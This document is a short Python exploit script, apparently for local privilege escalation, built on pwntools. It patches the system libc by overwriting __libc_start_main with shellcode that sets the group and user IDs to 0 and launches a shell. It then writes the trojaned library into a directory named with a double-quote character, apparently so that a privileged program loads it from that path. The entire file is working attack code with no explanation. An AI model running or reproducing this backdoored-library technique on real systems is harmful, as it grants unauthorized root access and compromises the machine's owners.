#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"
libc         = "/lib/x86_64-linux-gnu/libc.so.6"
libc_object  = ELF(libc, checksec=False)
content      = open(libc, "rb").read()
offset       = libc_object.symbols.__libc_start_main
payload      = asm(shellcraft.setgid(0) + shellcraft.setuid(0) + shellcraft.sh())
new_content  = content[:offset] + payload + content[offset + len(payload):]


os.mkdir('./"')
open('./"/libc.so.6', "wb").write(new_content)
